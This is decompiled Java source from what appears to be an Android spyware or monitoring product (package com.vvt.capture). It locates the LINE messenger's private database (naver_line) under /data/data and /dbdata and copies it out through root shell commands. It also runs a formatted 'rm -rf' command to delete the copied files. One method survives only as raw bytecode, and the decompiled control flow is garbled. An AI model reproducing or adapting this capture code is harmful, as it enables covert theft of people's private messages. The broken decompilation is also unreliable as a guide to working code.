package com.vvt.capture.c;

import com.vvt.ak.a;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;

public class m
{
  private static final boolean a = a.a;
  private static final boolean b = a.e;
  
  public static String a()
  {
    int i = 3;
    int j = 2;
    int k = 1;
    int m = 0;
    String str1 = null;
    String[] arrayOfString = new String[j];
    boolean bool1 = false;
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[k] = "jp.naver.line.android";
    arrayOfObject[j] = "naver_line";
    String str2 = String.format("%s/%s/databases/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[k] = "jp.naver.line.android";
    String str3 = "naver_line";
    arrayOfObject[j] = str3;
    str2 = String.format("%s/%s/%s", arrayOfObject);
    arrayOfString[k] = str2;
    int n = arrayOfString.length;
    int i1 = 0;
    str2 = null;
    if (i1 < n)
    {
      str1 = arrayOfString[i1];
      boolean bool2 = ShellUtil.b(str1);
      if (bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      m = i1 + 1;
      i1 = m;
      break;
      m = 0;
      str1 = null;
    }
  }
  
  /* Error */
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    // Byte code:
    //   0: ldc 2
    //   2: astore 4
    //   4: aload 4
    //   6: monitorenter
    //   7: aconst_null
    //   8: astore 5
    //   10: aload_0
    //   11: invokestatic 43	com/vvt/shell/ShellUtil:removeFromPath	(Ljava/lang/String;)Z
    //   14: istore 6
    //   16: iload 6
    //   18: ifeq +386 -> 404
    //   21: new 45	java/io/File
    //   24: astore 7
    //   26: aload 7
    //   28: aload_0
    //   29: invokespecial 49	java/io/File:<init>	(Ljava/lang/String;)V
    //   32: aload 7
    //   34: invokevirtual 53	java/io/File:getName	()Ljava/lang/String;
    //   37: astore 7
    //   39: aload_1
    //   40: aload_2
    //   41: invokestatic 56	com/vvt/capture/MyUncaughtExceptionHandler/m:removeFromPath	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   44: astore 8
    //   46: aload 8
    //   48: aload 7
    //   50: invokestatic 60	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   53: astore 5
    //   55: aload_1
    //   56: invokestatic 65	com/vvt/capture/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	(Ljava/lang/String;)Ljava/lang/String;
    //   59: astore 7
    //   61: getstatic 12	com/vvt/capture/MyUncaughtExceptionHandler/m:a	Z
    //   64: istore 9
    //   66: iload 9
    //   68: ifeq +3 -> 71
    //   71: ldc 67
    //   73: astore 10
    //   75: iconst_5
    //   76: istore 11
    //   78: iload 11
    //   80: anewarray 4	java/lang/Object
    //   83: astore 12
    //   85: iconst_0
    //   86: istore 13
    //   88: aload 12
    //   90: iconst_0
    //   91: aload 8
    //   93: aastore
    //   94: iconst_1
    //   95: istore 13
    //   97: aload 12
    //   99: iload 13
    //   101: aload 8
    //   103: aastore
    //   104: iconst_2
    //   105: istore 13
    //   107: aload 12
    //   109: iload 13
    //   111: aload_3
    //   112: aastore
    //   113: iconst_3
    //   114: istore 13
    //   116: aload 12
    //   118: iload 13
    //   120: aload_3
    //   121: aastore
    //   122: iconst_4
    //   123: istore 13
    //   125: aload 12
    //   127: iload 13
    //   129: aload 8
    //   131: aastore
    //   132: aload 10
    //   134: aload 12
    //   136: invokestatic 34	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   139: astore 10
    //   141: aload 10
    //   143: invokestatic 72	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   146: pop
    //   147: invokestatic 78	com/vvt/aa/a:MyUncaughtExceptionHandler	()Z
    //   150: istore 9
    //   152: iload 9
    //   154: ifeq +8 -> 162
    //   157: aload 8
    //   159: invokestatic 81	com/vvt/shell/ShellUtil:k	(Ljava/lang/String;)V
    //   162: getstatic 12	com/vvt/capture/MyUncaughtExceptionHandler/m:a	Z
    //   165: istore 9
    //   167: iload 9
    //   169: ifeq +3 -> 172
    //   172: ldc 83
    //   174: astore 10
    //   176: iconst_3
    //   177: istore 11
    //   179: iload 11
    //   181: anewarray 4	java/lang/Object
    //   184: astore 12
    //   186: iconst_0
    //   187: istore 13
    //   189: aload 12
    //   191: iconst_0
    //   192: aload 7
    //   194: aastore
    //   195: iconst_1
    //   196: istore 13
    //   198: aload 12
    //   200: iload 13
    //   202: aload_0
    //   203: aastore
    //   204: iconst_2
    //   205: istore 13
    //   207: aload 12
    //   209: iload 13
    //   211: aload 8
    //   213: aastore
    //   214: aload 10
    //   216: aload 12
    //   218: invokestatic 34	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   221: astore 10
    //   223: aload 10
    //   225: invokestatic 72	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   228: pop
    //   229: getstatic 12	com/vvt/capture/MyUncaughtExceptionHandler/m:a	Z
    //   232: istore 9
    //   234: iload 9
    //   236: ifeq +3 -> 239
    //   239: ldc 85
    //   241: astore 10
    //   243: iconst_2
    //   244: istore 11
    //   246: iload 11
    //   248: anewarray 4	java/lang/Object
    //   251: astore 12
    //   253: iconst_0
    //   254: istore 13
    //   256: aload 12
    //   258: iconst_0
    //   259: aload 7
    //   261: aastore
    //   262: iconst_1
    //   263: istore 13
    //   265: aload 12
    //   267: iload 13
    //   269: aload 8
    //   271: aastore
    //   272: aload 10
    //   274: aload 12
    //   276: invokestatic 34	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   279: astore 10
    //   281: aload 10
    //   283: invokestatic 72	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   286: pop
    //   287: getstatic 12	com/vvt/capture/MyUncaughtExceptionHandler/m:a	Z
    //   290: istore 9
    //   292: iload 9
    //   294: ifeq +3 -> 297
    //   297: ldc 87
    //   299: astore 10
    //   301: iconst_4
    //   302: istore 11
    //   304: iload 11
    //   306: anewarray 4	java/lang/Object
    //   309: astore 12
    //   311: iconst_0
    //   312: istore 13
    //   314: aload 12
    //   316: iconst_0
    //   317: aload 7
    //   319: aastore
    //   320: iconst_1
    //   321: istore 6
    //   323: aload 12
    //   325: iload 6
    //   327: aload_3
    //   328: aastore
    //   329: iconst_2
    //   330: istore 6
    //   332: aload 12
    //   334: iload 6
    //   336: aload_3
    //   337: aastore
    //   338: iconst_3
    //   339: istore 6
    //   341: aload 12
    //   343: iload 6
    //   345: aload 8
    //   347: aastore
    //   348: aload 10
    //   350: aload 12
    //   352: invokestatic 34	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   355: astore 7
    //   357: aload 7
    //   359: invokestatic 72	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   362: pop
    //   363: invokestatic 78	com/vvt/aa/a:MyUncaughtExceptionHandler	()Z
    //   366: istore 6
    //   368: iload 6
    //   370: ifeq +18 -> 388
    //   373: aload 8
    //   375: invokestatic 90	com/vvt/shell/ShellUtil:l	(Ljava/lang/String;)V
    //   378: getstatic 12	com/vvt/capture/MyUncaughtExceptionHandler/m:a	Z
    //   381: istore 6
    //   383: iload 6
    //   385: ifeq +3 -> 388
    //   388: getstatic 12	com/vvt/capture/MyUncaughtExceptionHandler/m:a	Z
    //   391: istore 6
    //   393: iload 6
    //   395: ifeq +3 -> 398
    //   398: aload 4
    //   400: monitorexit
    //   401: aload 5
    //   403: areturn
    //   404: getstatic 12	com/vvt/capture/MyUncaughtExceptionHandler/m:a	Z
    //   407: istore 6
    //   409: iload 6
    //   411: ifeq -13 -> 398
    //   414: goto -16 -> 398
    //   417: astore 7
    //   419: getstatic 17	com/vvt/capture/MyUncaughtExceptionHandler/m:removeFromPath	Z
    //   422: istore 6
    //   424: iload 6
    //   426: ifeq -28 -> 398
    //   429: goto -31 -> 398
    //   432: astore 5
    //   434: aload 4
    //   436: monitorexit
    //   437: aload 5
    //   439: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	440	0	paramString1	String
    //   0	440	1	paramString2	String
    //   0	440	2	paramString3	String
    //   0	440	3	paramString4	String
    //   2	433	4	localClass	Class
    //   8	394	5	str1	String
    //   432	6	5	localObject1	Object
    //   14	312	6	bool1	boolean
    //   330	14	6	i	int
    //   366	59	6	bool2	boolean
    //   24	334	7	localObject2	Object
    //   417	1	7	localException	Exception
    //   44	330	8	str2	String
    //   64	229	9	bool3	boolean
    //   73	276	10	str3	String
    //   76	229	11	j	int
    //   83	268	12	arrayOfObject	Object[]
    //   86	227	13	k	int
    // Exception table:
    //   from	to	target	type
    //   21	24	417	java/lang/Exception
    //   28	32	417	java/lang/Exception
    //   32	37	417	java/lang/Exception
    //   40	44	417	java/lang/Exception
    //   48	53	417	java/lang/Exception
    //   55	59	417	java/lang/Exception
    //   61	64	417	java/lang/Exception
    //   78	83	417	java/lang/Exception
    //   91	94	417	java/lang/Exception
    //   101	104	417	java/lang/Exception
    //   111	113	417	java/lang/Exception
    //   120	122	417	java/lang/Exception
    //   129	132	417	java/lang/Exception
    //   134	139	417	java/lang/Exception
    //   141	147	417	java/lang/Exception
    //   147	150	417	java/lang/Exception
    //   157	162	417	java/lang/Exception
    //   162	165	417	java/lang/Exception
    //   179	184	417	java/lang/Exception
    //   192	195	417	java/lang/Exception
    //   202	204	417	java/lang/Exception
    //   211	214	417	java/lang/Exception
    //   216	221	417	java/lang/Exception
    //   223	229	417	java/lang/Exception
    //   229	232	417	java/lang/Exception
    //   246	251	417	java/lang/Exception
    //   259	262	417	java/lang/Exception
    //   269	272	417	java/lang/Exception
    //   274	279	417	java/lang/Exception
    //   281	287	417	java/lang/Exception
    //   287	290	417	java/lang/Exception
    //   304	309	417	java/lang/Exception
    //   317	320	417	java/lang/Exception
    //   327	329	417	java/lang/Exception
    //   336	338	417	java/lang/Exception
    //   345	348	417	java/lang/Exception
    //   350	355	417	java/lang/Exception
    //   357	363	417	java/lang/Exception
    //   363	366	417	java/lang/Exception
    //   373	378	417	java/lang/Exception
    //   378	381	417	java/lang/Exception
    //   388	391	417	java/lang/Exception
    //   404	407	417	java/lang/Exception
    //   10	14	432	finally
    //   21	24	432	finally
    //   28	32	432	finally
    //   32	37	432	finally
    //   40	44	432	finally
    //   48	53	432	finally
    //   55	59	432	finally
    //   61	64	432	finally
    //   78	83	432	finally
    //   91	94	432	finally
    //   101	104	432	finally
    //   111	113	432	finally
    //   120	122	432	finally
    //   129	132	432	finally
    //   134	139	432	finally
    //   141	147	432	finally
    //   147	150	432	finally
    //   157	162	432	finally
    //   162	165	432	finally
    //   179	184	432	finally
    //   192	195	432	finally
    //   202	204	432	finally
    //   211	214	432	finally
    //   216	221	432	finally
    //   223	229	432	finally
    //   229	232	432	finally
    //   246	251	432	finally
    //   259	262	432	finally
    //   269	272	432	finally
    //   274	279	432	finally
    //   281	287	432	finally
    //   287	290	432	finally
    //   304	309	432	finally
    //   317	320	432	finally
    //   327	329	432	finally
    //   336	338	432	finally
    //   345	348	432	finally
    //   350	355	432	finally
    //   357	363	432	finally
    //   363	366	432	finally
    //   373	378	432	finally
    //   378	381	432	finally
    //   388	391	432	finally
    //   404	407	432	finally
    //   419	422	432	finally
  }
  
  public static void a(String paramString1, String paramString2)
  {
    String str1 = b(paramString1, paramString2);
    String str2 = "rm -rf %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  private static String b(String paramString1, String paramString2)
  {
    return p.a(paramString1, paramString2);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/MyUncaughtExceptionHandler/m.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */